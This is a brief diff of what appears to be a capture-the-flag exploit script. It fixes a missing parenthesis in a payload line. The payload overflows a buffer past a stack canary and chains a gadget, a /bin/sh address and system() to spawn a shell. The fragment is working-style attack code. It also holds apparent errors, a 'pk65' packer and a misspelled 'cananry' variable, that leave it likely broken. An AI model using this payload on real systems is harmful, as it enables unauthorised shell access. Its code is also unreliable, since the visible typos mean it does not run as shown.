@@ -144,7 +144,7 @@ def exploit(p,canary,system,binsh):
     p.recvul(">")
     p.sendl("1")
     p.recvul(":")
-    p.sendl("A"*72+pk65(cananry)+"B"*8+pk64(gadget1)+pk64(binsh)+pk64(system)
+    p.sendl("A"*72+pk65(cananry)+"B"*8+pk64(gadget1)+pk64(binsh)+pk64(system))
 
 
         
